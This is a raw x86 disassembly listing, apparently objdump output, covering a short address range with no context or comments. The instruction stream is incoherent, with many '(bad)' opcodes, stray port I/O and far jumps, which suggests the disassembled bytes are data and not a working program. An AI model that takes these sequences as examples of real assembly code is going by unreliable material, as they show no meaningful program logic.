  41ae61:	fidiv  WORD PTR [ecx]
  41ae63:	icebp  
  41ae64:	pop    edx
  41ae65:	mov    ss,WORD PTR [edx]
  41ae67:	mov    al,ds:0x47668cde
  41ae6c:	popa   
  41ae6d:	andnps xmm5,xmm1
  41ae70:	outs   dx,BYTE PTR es:[esi]
  41ae72:	out    dx,eax
  41ae73:	ins    BYTE PTR es:[edi],dx
  41ae74:	imul   esi,ebx,0x9789a22c
  41ae7a:	jecxz  0x41ae94
  41ae7c:	cmp    DWORD PTR [ecx+0x352654db],ecx
  41ae82:	cmc    
  41ae83:	adc    DWORD PTR [esi+eiz*8],0xffffffea
  41ae87:	mov    WORD PTR [edx+0x103a877e],?
  41ae8d:	push   ds
  41ae8e:	fwait
  41ae8f:	xor    BYTE PTR [edx-0x2b],bh
  41ae92:	inc    eax
  41ae93:	or     eax,DWORD PTR [ebx]
  41ae95:	aam    0xc7
  41ae97:	jae    0x41ae2f
  41ae99:	push   es
  41ae9a:	jo     0x41aed7
  41ae9c:	jmp    0xc3948337
  41aea1:	push   edi
  41aea2:	sbb    eax,0xd3bd9f2a
  41aea7:	mov    BYTE PTR ds:[ecx],dh
  41aeaa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aeab:	xor    ecx,DWORD PTR [edi]
  41aead:	mov    dh,0x82
  41aeaf:	ret    
  41aeb0:	test   al,0xb7
  41aeb2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aeb3:	sub    esi,DWORD PTR [ebx]
  41aeb5:	mov    WORD PTR [ecx-0x11],fs
  41aeb8:	inc    edi
  41aeb9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aeba:	sbb    esi,eax
  41aebc:	test   al,0xa3
  41aebe:	retf   0x72f0
  41aec1:	in     eax,0xb1
  41aec3:	sub    esp,esi
  41aec5:	cli    
  41aec6:	add    ah,BYTE PTR ds:0x6fd0a96a
  41aecc:	sub    al,0x55
  41aece:	shl    BYTE PTR [edi],0xf
  41aed1:	dec    esi
  41aed2:	dec    eax
  41aed3:	or     al,0x4d
  41aed5:	add    ebp,DWORD PTR [ecx]
  41aed7:	sub    al,BYTE PTR [edi+0x5301c7b2]
  41aedd:	fs jge 0x41ae63
  41aee0:	jbe    0x41aeae
  41aee2:	fmul   DWORD PTR [esi]
  41aee4:	(bad)  
  41aee5:	in     al,0xee
  41aee7:	inc    esi
  41aee8:	stos   DWORD PTR es:[edi],eax
  41aee9:	and    dh,BYTE PTR [ebx-0x401783b9]
  41aeef:	mov    al,0x5f
  41aef1:	ror    BYTE PTR [edi-0x1c],cl
  41aef4:	sti    
  41aef5:	jmp    0x4882:0x627dd66a
  41aefc:	push   edi
  41aefd:	mov    ah,0x15
  41aeff:	xchg   edi,eax
  41af00:	cmp    al,0x81
  41af02:	mov    edi,0xb7146763
  41af07:	pop    esi
  41af08:	into   
  41af09:	push   ebx
  41af0a:	scas   al,BYTE PTR es:[edi]
  41af0b:	push   ds
  41af0c:	and    DWORD PTR ds:0xef37fbca,edx
  41af12:	sub    DWORD PTR [esi+0x46e2f933],edi
  41af18:	test   eax,0x6f5e9f5b
  41af1d:	stos   BYTE PTR es:[edi],al
  41af1e:	jl     0x41aece
  41af20:	sub    esi,edi
  41af22:	addr16 call 0x355e:0xe4a03384
  41af2a:	popa   
  41af2b:	leave  
  41af2c:	dec    eax
  41af2d:	icebp  
  41af2e:	mov    bl,0x7b
  41af30:	es cmp eax,0xef723a30
  41af36:	mov    eax,0x4b387fd9
  41af3b:	adc    cl,BYTE PTR [edx-0x9669e67]
  41af41:	das    
  41af42:	sahf   
  41af43:	xor    ch,BYTE PTR [ebx+0x71]
  41af46:	cmp    BYTE PTR [ebp+0x76],dh
  41af49:	add    esi,0x6a
  41af4c:	mov    ebx,0xac89eede
  41af51:	out    dx,al
  41af52:	lock in eax,0xd1
  41af55:	call   0x9a7f:0x81499264
  41af5c:	int3   
  41af5d:	in     eax,dx
  41af5e:	out    dx,al
  41af5f:	in     eax,dx
  41af60:	mov    dl,0xf6
  41af62:	mov    cl,bl
  41af64:	sub    eax,0x9b21c20c
  41af69:	xlat   BYTE PTR ds:[ebx]
  41af6a:	test   DWORD PTR [edx+0x4b],eax
  41af6d:	retf   0x55cc
  41af70:	cmp    ebp,ebx
  41af72:	xor    BYTE PTR [esi],bl
  41af74:	loop   0x41af19
  41af76:	add    esi,ebp
  41af78:	push   0x35
  41af7a:	retf   0xc8fb
  41af7d:	stos   DWORD PTR es:[edi],eax
  41af7e:	lahf   
  41af7f:	sbb    dl,bh
  41af81:	sub    ah,cl
  41af83:	(bad)  
  41af85:	inc    ebp
  41af86:	sbb    ebp,DWORD PTR [esi]
  41af88:	(bad)  
  41af89:	sbb    BYTE PTR [ecx+0x56],0x85
  41af8d:	jae    0x41aff4
  41af8f:	mov    al,ds:0x1088c760
  41af94:	cdq    
  41af95:	sahf   
  41af96:	ins    DWORD PTR es:[edi],dx
  41af97:	xlat   BYTE PTR ds:[ebx]
  41af98:	lds    ecx,FWORD PTR [ebx+0x58]
  41af9b:	cwde   
  41af9c:	adc    esp,DWORD PTR [edi+0xd]
  41af9f:	loop   0x41afdf
  41afa1:	xchg   edx,eax
  41afa2:	inc    ebp
  41afa3:	(bad)  
  41afa4:	popa   
  41afa5:	pop    esi
  41afa6:	inc    edx
  41afa7:	pushf  
  41afa8:	inc    BYTE PTR [esi+0x43]
  41afab:	rcr    DWORD PTR [esp],cl
  41afae:	test   ebx,edx
  41afb0:	leave  
  41afb1:	pop    edx
  41afb2:	add    BYTE PTR [ebp-0x55],bh
  41afb5:	mov    ds:0xf38ccd2b,al
  41afba:	cld    
  41afbb:	call   0x38da:0x1c72b22
  41afc2:	mov    dh,0x95
  41afc4:	dec    ebx
  41afc5:	int    0xac
  41afc7:	sbb    al,0x40
  41afc9:	pop    eax
  41afca:	or     DWORD PTR [esi-0x18958af5],edi
  41afd0:	retf   0x5f6c
  41afd3:	fdiv   st,st(1)
  41afd5:	lods   al,BYTE PTR ds:[esi]
  41afd6:	push   cs
  41afd7:	mov    bl,0x32
  41afd9:	cmc    
  41afda:	gs xchg esi,eax
  41afdc:	adc    dl,BYTE PTR [edi+esi*2-0xb11a103]
  41afe3:	(bad)  
  41afe4:	xlat   BYTE PTR ds:[ebx]
  41afe5:	vpandn xmm5,xmm0,XMMWORD PTR [ebp*1+0x4e12d141]
  41afee:	jmp    0x41af73
  41aff0:	cmp    al,0xf3
  41aff2:	aaa    
  41aff3:	add    ah,BYTE PTR [edx]
  41aff5:	mov    edi,?
  41aff7:	push   ecx
  41aff8:	cli    
  41aff9:	enter  0x4d4d,0x37
  41affd:	ds loopne 0x41b029
  41b000:	mov    ecx,DWORD PTR [edi]
  41b002:	or     BYTE PTR [ecx+0x10],dh
  41b005:	inc    eax
  41b006:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b007:	mov    ds:0xe4d803b7,eax
  41b00c:	pop    esp
  41b00d:	or     DWORD PTR [edx],esp
  41b00f:	cli    
  41b010:	sahf   
  41b011:	xchg   edx,eax
  41b012:	xchg   edx,eax
  41b013:	mov    esp,0x78883b00
  41b018:	sub    al,0xa6
  41b01a:	das    
  41b01b:	popa   
  41b01c:	pushf  
  41b01d:	pushf  
  41b01e:	xor    eax,0xf4471326
  41b023:	loopne 0x41b070
  41b025:	or     DWORD PTR [ecx],ecx
  41b027:	adc    DWORD PTR [ebx-0x3b62fe6c],ebp
  41b02d:	push   edx
  41b02e:	les    ebx,FWORD PTR [edi+0x3e]
  41b031:	push   es
  41b032:	inc    edi
  41b033:	outs   dx,BYTE PTR ds:[esi]
  41b034:	inc    esi
  41b035:	cmp    esp,DWORD PTR [ebx-0x3ae993cc]
  41b03b:	pop    esi
  41b03c:	stos   DWORD PTR es:[edi],eax
  41b03d:	lahf   
  41b03e:	pop    eax
  41b03f:	fisttp QWORD PTR [edi]
  41b041:	and    BYTE PTR ds:0xd7332f95,ah
  41b047:	xchg   DWORD PTR ds:0xe4d9e43b,esp
  41b04d:	test   al,0x4e
  41b04f:	lock popa 
  41b051:	je     0x41b02e
  41b053:	and    DWORD PTR [eax+0x4af71b39],ecx
  41b059:	test   DWORD PTR [eax],ebp
  41b05b:	xor    DWORD PTR [edi+0x15331915],eax
  41b061:	jge    0x41aff0
  41b063:	test   bl,dh
  41b065:	add    DWORD PTR [ebp+0x3c],0xffffffce
  41b069:	fucom  st(3)
  41b06b:	ror    dh,0xea
  41b06e:	jo     0x41b0b2
  41b070:	pop    edi
  41b071:	dec    ebx
  41b072:	test   DWORD PTR [esi*4+0x1f083e92],ebp
  41b079:	or     esp,DWORD PTR [esi+eax*4-0x6f40cd28]
  41b080:	in     eax,0xb3
  41b082:	adc    eax,0xf25663a6
  41b087:	pop    edi
  41b088:	mov    BYTE PTR [edi-0x7d],dh
  41b08b:	jne    0x41b0eb
  41b08d:	pop    eax
  41b08e:	lock je 0x41b109
  41b091:	xchg   ebx,eax
  41b092:	popf   
  41b093:	(bad)  
  41b094:	scas   al,BYTE PTR es:[edi]
  41b095:	je     0x41b0b5
  41b097:	cmp    eax,0x8565d03f
  41b09c:	fstp   QWORD PTR [edx-0x6c]
  41b09f:	mov    al,0x6b
  41b0a1:	je     0x41b055
  41b0a3:	inc    edi
  41b0a4:	jl     0x41b06d
  41b0a6:	pop    ebx
  41b0a7:	adc    DWORD PTR [edi+0x51a5db98],edi
  41b0ad:	int    0xa3
  41b0af:	fucom  st(0)
  41b0b1:	xchg   DWORD PTR [ebp+esi*1-0x26],esp
  41b0b5:	ins    BYTE PTR es:[edi],dx
  41b0b6:	sub    BYTE PTR [edx],0x4a
  41b0b9:	js     0x41b0a5
  41b0bb:	lock (bad) 
  41b0bd:	mov    ch,0xdc
  41b0bf:	lea    eax,[esi+0x4af8a5d1]
  41b0c5:	repz add edx,DWORD PTR [esi]
  41b0c8:	aad    0x7f
  41b0ca:	xchg   edx,eax
  41b0cb:	adc    ah,BYTE PTR [edx-0x77]
  41b0ce:	popa   
  41b0cf:	and    eax,0x58d0b995
  41b0d4:	mov    bl,0x2c
  41b0d6:	ins    DWORD PTR es:[edi],dx
  41b0d7:	neg    BYTE PTR [ecx+eax*2+0x7d]
  41b0db:	push   ds
  41b0dc:	mov    ebp,DWORD PTR [ebp+ebp*4+0x44429a83]
  41b0e3:	add    ch,BYTE PTR [edi]
  41b0e5:	lods   al,BYTE PTR ds:[esi]
  41b0e6:	out    0x23,al
  41b0e8:	sub    al,0xb
  41b0ea:	sub    DWORD PTR [eax+0x3f6e21da],edi
  41b0f0:	or     al,0x72
  41b0f2:	(bad)  
  41b0f3:	out    0x2b,al
  41b0f5:	add    eax,0xa684bb94
  41b0fa:	lahf   
  41b0fb:	retf   
  41b0fc:	dec    ebp
  41b0fd:	adc    DWORD PTR [ebp+0x1fb5e873],ebp
  41b103:	xchg   ebp,eax
  41b104:	fisttp QWORD PTR [ecx]
  41b106:	xor    eax,0x6db6b68a
  41b10b:	jmp    0x282c3ad1
  41b110:	jge    0x41b0d6
  41b112:	out    dx,al
  41b113:	int3   
  41b114:	dec    ecx
  41b115:	rcr    BYTE PTR [edi+ebp*1],cl
  41b118:	push   es
  41b119:	or     eax,0x38c0036d
  41b11e:	push   ebx
  41b11f:	jmp    0x41b0c4
  41b121:	inc    edx
  41b122:	call   0x66966417
  41b127:	loop   0x41b187
  41b129:	dec    eax
  41b12a:	lea    esp,[ecx]
  41b12c:	or     ebp,ecx
  41b12e:	sbb    ebx,esp
  41b130:	cs xchg edx,eax
  41b132:	push   esi
  41b133:	pop    edx
  41b134:	retf   
  41b135:	test   al,ah
  41b137:	aaa    
  41b138:	inc    edx
  41b139:	ror    DWORD PTR [ebp+0x76],1
  41b13c:	ret    0xdd47
  41b13f:	lods   ax,WORD PTR ds:[esi]
  41b141:	retf   0xc3f0
  41b144:	sbb    bl,dh
  41b146:	scas   eax,DWORD PTR es:[edi]
  41b147:	dec    ebx
  41b148:	pop    ebp
  41b149:	test   dl,0xdc
  41b14c:	out    dx,al
  41b14d:	sub    al,0xcb
  41b14f:	sub    BYTE PTR [esi+ebx*8],0x72
  41b153:	pop    ecx
  41b154:	jp     0x41b13d
  41b156:	imul   bl
  41b158:	mov    ebx,0xfcc08f4b
  41b15d:	xchg   ebp,eax
  41b15e:	not    DWORD PTR [ebp+0x2dbb1323]
  41b164:	pop    edx
  41b165:	push   ecx
  41b166:	(bad)  
  41b167:	fistp  QWORD PTR [ebp+0x153ff5e6]
  41b16d:	rol    BYTE PTR [esi+0x6a877daa],1
  41b173:	test   eax,0xd8c1b43b
  41b178:	das    
  41b179:	adc    DWORD PTR ds:0x4f920cc5,ebp
  41b17f:	into   
  41b180:	dec    ebp
  41b181:	sub    BYTE PTR [edx+ebx*4-0x10d93d08],bh
  41b188:	and    DWORD PTR [esi+0x10],esi
  41b18b:	(bad)  
  41b18c:	loope  0x41b139
  41b18e:	ficom  DWORD PTR [eax]
  41b190:	and    eax,0x291358d4
  41b195:	sahf   
  41b196:	mov    dh,0xb2
  41b198:	(bad)  
  41b199:	or     bl,ah
  41b19b:	cmp    ah,BYTE PTR [ecx]
  41b19d:	or     DWORD PTR [edx],ebp
  41b19f:	xor    al,0x3f
  41b1a1:	mov    edi,0x626ee7ae
  41b1a6:	add    DWORD PTR [ebp+edi*2-0x69501c21],ecx
  41b1ad:	push   cs
  41b1ae:	inc    ebp
  41b1af:	nop
  41b1b0:	push   ss
  41b1b1:	add    esi,DWORD PTR [ecx+0x63]
  41b1b4:	test   eax,0xf0e08ad7
  41b1b9:	popf   
  41b1ba:	mov    dh,0xc
  41b1bc:	enter  0x8ab1,0xe7
  41b1c0:	dec    edx
  41b1c1:	jb     0x41b1a3
  41b1c3:	arpl   si,di
  41b1c5:	test   BYTE PTR [ebx-0x36],al
  41b1c8:	jb     0x41b222
  41b1ca:	mov    al,ds:0xcd3767d3
  41b1cf:	sub    DWORD PTR [esi+0x55],ebx
  41b1d2:	sub    WORD PTR [edi+0x39a33d02],si
  41b1d9:	push   edi
  41b1da:	pop    edx
  41b1db:	outs   dx,BYTE PTR ds:[esi]
  41b1dc:	inc    ebx
  41b1dd:	outs   dx,BYTE PTR ds:[esi]
  41b1de:	(bad)  
  41b1e0:	call   0xa71ffef3
  41b1e5:	out    dx,al
  41b1e6:	xor    eax,0x104de489
  41b1eb:	ja     0x41b1e3
  41b1ed:	push   ss
  41b1ee:	xchg   edx,eax
  41b1ef:	call   FWORD PTR [ecx+0x260396c8]
  41b1f5:	sahf   
  41b1f6:	outs   dx,BYTE PTR cs:[esi]
  41b1f8:	mov    edi,0xd4c2e514
  41b1fd:	pop    edx
  41b1fe:	or     al,0xda
  41b200:	scas   eax,DWORD PTR es:[edi]
  41b201:	pop    es
  41b202:	mov    ah,0xfb
  41b204:	dec    esi
  41b205:	popf   
  41b206:	mov    ds:0xe31d7e69,eax
  41b20b:	pop    ecx
  41b20c:	sub    BYTE PTR [edx],0xc2
  41b20f:	jb     0x41b1e3
  41b211:	mov    dh,0x21
  41b213:	xor    al,0xd6
  41b215:	pop    ebx
  41b216:	ins    BYTE PTR es:[edi],dx
  41b217:	aam    0xc0
  41b219:	js     0x41b274
  41b21b:	jnp    0x41b1a6
  41b21d:	mov    fs,WORD PTR [edi+0x6e]
  41b220:	je     0x41b22f
  41b222:	jg     0x41b1c8
  41b224:	jb     0x41b200
  41b226:	add    eax,0x746e3f91
  41b22b:	push   es
  41b22c:	or     al,0x97
  41b22e:	dec    ebx
  41b22f:	out    0x89,eax
  41b231:	mov    eax,0xf5d6e6bd
  41b236:	xchg   ecx,eax
  41b237:	add    eax,0x26aef944
  41b23c:	mov    dl,0x90
  41b23e:	lea    ebx,[ebp+0x2a]
  41b241:	imul   edi,DWORD PTR [ebx],0x5a7d93bf
  41b247:	out    dx,eax
  41b248:	jle    0x41b277
  41b24a:	cdq    
  41b24b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b24c:	(bad)  
  41b24d:	stos   DWORD PTR es:[edi],eax
  41b24e:	pop    eax
  41b24f:	test   al,0xa0
  41b251:	hlt    
  41b252:	xchg   ecx,eax
  41b253:	mov    eax,ds:0xf057052c
  41b258:	and    cl,BYTE PTR [ebx]
  41b25a:	hlt    
  41b25b:	push   0x8
  41b25d:	(bad)  
  41b25e:	xor    ebp,esi
  41b260:	cli    
  41b261:	outs   dx,DWORD PTR ds:[esi]
  41b262:	sub    BYTE PTR [edi+0x134a3c26],ch
  41b268:	(bad)  
  41b269:	leave  
  41b26a:	xor    eax,0xd821780b
  41b26f:	push   0x6c
  41b271:	dec    edx
  41b272:	mov    DWORD PTR [ebx+0x36],ebx
  41b275:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b276:	cmp    eax,0xf992848e
  41b27b:	nop
  41b27c:	js     0x41b230
  41b27e:	mov    al,ds:0xdba1a685
  41b283:	sub    al,bl
  41b285:	mov    al,0xfa
  41b287:	stos   BYTE PTR es:[edi],al
  41b288:	push   es
  41b289:	inc    ecx
  41b28a:	mov    dh,0x2f
  41b28c:	push   edi
  41b28d:	xchg   BYTE PTR ds:0x9ae57adf,ch
  41b293:	pop    ebx
  41b294:	fwait
  41b295:	call   0x217a:0xc6843fa1
  41b29c:	pushf  
  41b29d:	jo     0x41b2b4
  41b29f:	cmc    
  41b2a0:	mov    cl,0xd0
  41b2a2:	ss shl dh,1
  41b2a5:	ret    0x835e
  41b2a8:	leave  
  41b2a9:	jg     0x41b246
  41b2ab:	jge    0x41b2a9
  41b2ad:	push   ds
  41b2ae:	push   cs
  41b2af:	mov    eax,0xd2a7fc11
  41b2b4:	std    
  41b2b5:	adc    al,0xca
  41b2b7:	mov    eax,DWORD PTR [ebp+eiz*1+0x1]
  41b2bb:	cmp    bl,BYTE PTR [edx-0x1e]
  41b2be:	ja     0x41b2a2
  41b2c0:	mov    dh,ch
  41b2c2:	push   ebx
  41b2c3:	pop    ebp
  41b2c4:	fst    DWORD PTR [esi+0x6c]
  41b2c7:	fs mov al,bl
  41b2ca:	das    
  41b2cb:	repz ss inc ecx
  41b2ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b2cf:	mov    ebx,0xa74edac2
  41b2d4:	cmp    ecx,DWORD PTR [eax]
  41b2d6:	je     0x41b2af
  41b2d8:	adc    BYTE PTR [esi],bl
  41b2da:	shl    DWORD PTR [ebp+0x348b68d5],cl
  41b2e0:	mov    cl,0x6a
  41b2e2:	std    
  41b2e3:	mov    dl,0x8f
  41b2e5:	fwait
  41b2e6:	(bad)  
  41b2e7:	cmp    DWORD PTR [edi+0x56],edi
  41b2ea:	call   0x45aae33c
  41b2ef:	(bad)  
  41b2f0:	or     eax,0xc1f6d8a8
  41b2f5:	sbb    DWORD PTR [eax],edi
  41b2f7:	xchg   BYTE PTR [edi+0x2ab019f7],bh
  41b2fd:	mov    eax,0x30078006
  41b302:	jo     0x41b376
  41b304:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b305:	add    DWORD PTR [ecx-0x1c],edx
  41b308:	and    ecx,DWORD PTR [ecx+0x352d0de6]
  41b30e:	mov    ah,0x96
  41b310:	inc    ebp
  41b311:	and    bh,ch
  41b313:	stos   BYTE PTR es:[edi],al
  41b314:	int    0x2e
  41b316:	fidiv  WORD PTR [esi+0x3c001b9a]
  41b31c:	add    ebx,0x70
  41b31f:	aad    0xcb
  41b321:	out    0x5e,eax
  41b323:	pop    ebx
  41b324:	shl    BYTE PTR [eax-0x55],0x5c
  41b328:	popf   
  41b329:	pop    ebx
  41b32a:	aaa    
  41b32b:	aad    0x8b
  41b32d:	(bad)  
  41b32e:	mov    edi,edi
  41b330:	clc    
  41b331:	out    dx,eax
  41b332:	gs sub eax,0x387e27b9
  41b338:	scas   eax,DWORD PTR es:[edi]
  41b339:	push   0x757562ad
  41b33e:	mov    esp,0xbf8a0730
  41b343:	cmp    BYTE PTR [ebp+0x3c],ah
  41b346:	adc    eax,0xdea156ed
  41b34b:	lahf   
  41b34c:	retf   
  41b34d:	cmp    esi,eax
  41b34f:	lahf   
  41b350:	test   BYTE PTR [eax+eax*4-0x465b8662],dl
  41b357:	and    al,0x17
  41b359:	loope  0x41b3d5
  41b35b:	jle    0x41b36d
  41b35d:	mov    al,0x98
  41b35f:	inc    esp
  41b360:	jbe    0x41b3a5
  41b362:	sub    DWORD PTR [edx],ebx
  41b364:	cwde   
  41b365:	js     0x41b3c8
  41b367:	or     edi,ecx
  41b369:	mov    bh,0xa
  41b36b:	stos   DWORD PTR es:[edi],eax
  41b36c:	and    al,0x62
  41b36e:	rol    ah,0x3e
  41b371:	dec    eax
  41b372:	dec    edx
  41b373:	add    eax,0x9a0b278c
  41b378:	icebp  
  41b379:	push   es
  41b37a:	lods   eax,DWORD PTR ds:[esi]
  41b37b:	test   BYTE PTR [ebp+0x7e],al
  41b37e:	pop    ecx
  41b37f:	inc    ebp
  41b380:	or     ah,BYTE PTR [ecx+0x76abc465]
  41b386:	cmp    bh,BYTE PTR [eax]
  41b388:	sbb    edi,edx
  41b38a:	paddsw mm4,QWORD PTR [eax-0x59dddda3]
  41b391:	mov    DWORD PTR [esi+eiz*1+0x7a00f1c1],ecx
  41b398:	mov    DWORD PTR [ecx+0x5a],eax
  41b39b:	pusha  
  41b39c:	dec    edi
  41b39d:	or     al,0x82
  41b39f:	adc    bl,BYTE PTR [eax+0x4d9c7e77]
  41b3a5:	std    
  41b3a6:	js     0x41b40f
  41b3a8:	mov    cl,0xe
  41b3aa:	inc    ecx
  41b3ab:	lahf   
  41b3ac:	fldcw  WORD PTR [eax+0x11ad382a]
  41b3b2:	test   BYTE PTR [ebp-0x364d6221],bl
  41b3b8:	sbb    bh,BYTE PTR [eax-0x31]
  41b3bb:	mov    esp,0xc510e3a7
  41b3c0:	inc    eax
  41b3c1:	pop    ebx
  41b3c2:	inc    ebp
  41b3c3:	push   es
  41b3c4:	cld    
  41b3c5:	pop    ds
  41b3c6:	(bad)  
  41b3c7:	fst    DWORD PTR [edi-0x15]
  41b3ca:	cmp    al,0x62
  41b3cc:	cld    
  41b3cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b3ce:	sub    BYTE PTR [ebx+ebx*1+0x36],cl
  41b3d2:	mov    al,ds:0xf799802b
  41b3d7:	push   eax
  41b3d8:	shr    bl,cl
  41b3da:	xchg   edx,eax
  41b3db:	and    ecx,ebx
  41b3dd:	(bad)  
  41b3de:	jo     0x41b3d2
  41b3e0:	adc    al,0x6a
  41b3e2:	fdiv   st(7),st
  41b3e4:	aas    
  41b3e5:	in     al,0xeb
  41b3e7:	sbb    DWORD PTR [ebp+0x1b],ebp
  41b3ea:	test   al,0x7f
  41b3ec:	fisttp WORD PTR [eax]
  41b3ee:	jae    0x41b38b
  41b3f0:	cdq    
  41b3f1:	push   esp
  41b3f2:	bound  ebp,QWORD PTR [edx-0x60bd6747]
  41b3f8:	ins    BYTE PTR es:[edi],dx
  41b3f9:	fwait
  41b3fa:	push   ss
  41b3fb:	scas   eax,DWORD PTR es:[edi]
  41b3fc:	clc    
  41b3fd:	mov    cl,0xf9
  41b3ff:	in     eax,0xc5
  41b401:	inc    esi
  41b402:	gs pop ecx
  41b404:	jbe    0x41b396
  41b406:	add    eax,0xf6fa645f
  41b40b:	stos   DWORD PTR es:[edi],eax
  41b40c:	xchg   BYTE PTR [ecx+0x7],al
  41b40f:	test   ecx,ecx
  41b411:	xor    ch,al
  41b413:	pop    edx
  41b414:	cmp    eax,0xa454d6fc
  41b419:	xor    eax,0x3e9eb0cb
  41b41e:	pop    eax
  41b41f:	lods   al,BYTE PTR gs:[esi]
  41b421:	push   edi
  41b422:	scas   al,BYTE PTR es:[edi]
  41b423:	shl    BYTE PTR [ebx-0x7c],0x6b
  41b427:	mov    ebp,DWORD PTR [edx-0x4f]
  41b42a:	xchg   ebx,eax
  41b42b:	mov    eax,ds:0x5f2cba0b
  41b430:	mov    ebp,0xc674e2f2
  41b435:	jnp    0x41b410
  41b437:	(bad)  
  41b438:	jecxz  0x41b3ba
  41b43a:	jecxz  0x41b497
  41b43c:	retf   
  41b43d:	dec    ebx
  41b43e:	inc    ecx
  41b43f:	or     DWORD PTR [eax],0x558f658c
  41b445:	daa    
  41b446:	rcr    DWORD PTR [edi-0x3e],0x80
  41b44a:	mov    WORD PTR gs:[ebp+0x6a2a1b2a],?
  41b451:	fidiv  WORD PTR [eax+ebp*8]
  41b454:	jo     0x41b4b4
  41b456:	sub    bh,al
  41b458:	lea    edi,[esi+0x5161f8b0]
  41b45e:	mov    cl,0xcd
  41b460:	or     bh,BYTE PTR [ecx+eiz*1+0x24]
  41b464:	ss jo  0x41b40d
  41b467:	fadd   DWORD PTR [eax-0x57]
  41b46a:	dec    ecx
  41b46b:	jmp    0x135a2c93
  41b470:	jbe    0x41b43e
  41b472:	(bad)  
  41b473:	cld    
  41b474:	jb     0x41b4a7
  41b476:	outs   dx,DWORD PTR ds:[esi]
  41b477:	mul    BYTE PTR [ebp-0x36983bf6]
  41b47d:	pop    ecx
  41b47e:	mov    dh,0xf1
  41b480:	fld    TBYTE PTR [ecx]
  41b482:	dec    esp
  41b483:	std    
  41b484:	add    eax,0xc5eee147
  41b489:	mov    ?,WORD PTR [edx-0x1e81f4f8]
  41b48f:	mov    dh,0x1a
  41b491:	or     BYTE PTR [ebx-0x12],dh
  41b494:	push   edi
  41b495:	or     eax,0x57d64f0e
  41b49a:	sbb    BYTE PTR [ebx+0x29],cl
  41b49d:	inc    edx
  41b49e:	imul   eax,DWORD PTR [ebp+ebp*8+0x2],0x20
  41b4a3:	ja     0x41b512
  41b4a5:	adc    ebp,DWORD PTR [edi+0x42]
  41b4a8:	dec    esi
  41b4a9:	mov    ?,WORD PTR ds:0x782ad3e6
  41b4af:	imul   ebx,DWORD PTR [ecx+0x1c],0xffffffca
  41b4b3:	mov    esp,0xff521e36
  41b4b8:	cwde   
  41b4b9:	dec    eax
  41b4ba:	lds    ebp,FWORD PTR [ebx]
  41b4bc:	imul   edx,DWORD PTR [esi-0x1f],0x43392184
  41b4c3:	push   eax
  41b4c4:	js     0x41b46a
  41b4c6:	imul   BYTE PTR [esp+esi*1-0x4e]
  41b4ca:	push   cs
  41b4cb:	mov    bl,0xda
  41b4cd:	add    ebp,eax
  41b4cf:	push   edx
  41b4d0:	jl     0x41b530
  41b4d2:	call   0xacd6:0x1bcdf0c5
  41b4d9:	addr16 adc al,0x9e
  41b4dc:	push   esp
  41b4dd:	xor    ch,BYTE PTR [edi+0x55]
  41b4e0:	cmp    al,0xb4
  41b4e2:	jl     0x41b4f5
  41b4e4:	mov    bl,0xa5
  41b4e6:	xchg   BYTE PTR [eax],al
  41b4e8:	shl    BYTE PTR [ebp-0x39c64fff],cl
  41b4ee:	(bad)  
  41b4ef:	fdivr  DWORD PTR [edx-0x208b7cda]
  41b4f5:	(bad)  
  41b4f6:	jmp    0x2760:0xe1f74187
  41b4fd:	pop    ss
  41b4fe:	and    BYTE PTR [edi+eax*4],ch
  41b501:	retf   
  41b502:	jle    0x41b580
  41b504:	stos   DWORD PTR es:[edi],eax
  41b505:	into   
  41b506:	jmp    0xdd72:0xfc845b63
  41b50d:	jmp    0xf698f171
  41b512:	xor    edx,DWORD PTR [esi+0x7f]
  41b515:	aaa    
  41b516:	cmp    al,0x64
  41b518:	cmp    eax,0xca2a1436
  41b51d:	inc    ebp
  41b51e:	out    dx,eax
  41b51f:	adc    DWORD PTR [ebp+0x56],ebp
  41b522:	lahf   
  41b523:	mov    ecx,0x2544963c
  41b528:	mov    ah,cl
  41b52a:	sub    BYTE PTR [esi+0x7215349b],bh
  41b530:	fcmovu st,st(2)
  41b532:	and    al,0x89
  41b534:	inc    edi
  41b535:	lahf   
  41b536:	ins    BYTE PTR es:[edi],dx
  41b537:	fdivr  QWORD PTR [edx]
  41b539:	xor    eax,0x95602beb
  41b53e:	mov    ebp,0xdbf4aa40
  41b543:	push   ecx
  41b544:	mov    cl,0xa9
  41b546:	test   dh,bl
  41b548:	jp     0x41b577
  41b54a:	and    DWORD PTR [esp+eax*8-0x4e],edi
  41b54e:	pop    edi
  41b54f:	or     eax,0xbb9b283c
  41b554:	enter  0xede1,0x15
  41b558:	and    eax,0x2896816
  41b55d:	loopne 0x41b5c5
  41b55f:	call   0x8768fdc5
  41b564:	scas   al,BYTE PTR es:[edi]
  41b565:	enter  0x1fb3,0x43
  41b569:	cmp    DWORD PTR [edx],edi
  41b56b:	mov    dh,0x1d
  41b56d:	or     ecx,DWORD PTR [edi+edi*1-0x664f90ae]
  41b574:	adc    DWORD PTR [edx-0x34],0xffffffb4
  41b578:	inc    eax
  41b579:	out    0x6e,al
  41b57b:	push   edx
  41b57c:	mov    esp,0xcf2cf5bf
  41b581:	dec    DWORD PTR [edx+0x1e37959f]
  41b587:	addr16 jp 0x41b563
  41b58a:	scas   al,BYTE PTR es:[edi]
  41b58b:	or     bh,BYTE PTR [esi-0x80]
  41b58e:	jle    0x41b536
  41b590:	repnz mov al,0x6a
  41b593:	mov    DWORD PTR ds:0xb516cbd1,ebx
  41b599:	push   cs
  41b59a:	xchg   edi,eax
  41b59b:	adc    BYTE PTR [ebx],ch
  41b59d:	int    0xe5
  41b59f:	inc    edx
  41b5a0:	sbb    al,al
  41b5a2:	push   edx
  41b5a3:	jmp    0xe01c:0xacc6d7b7
  41b5aa:	cmc    
  41b5ab:	pushf  
  41b5ac:	cmp    edi,DWORD PTR [esi]
  41b5ae:	push   cs
  41b5af:	jne    0x41b585
  41b5b1:	pop    ds
  41b5b2:	sar    bh,1
  41b5b4:	jne    0x41b5ba
  41b5b6:	cmp    BYTE PTR [ebp+0x18],al
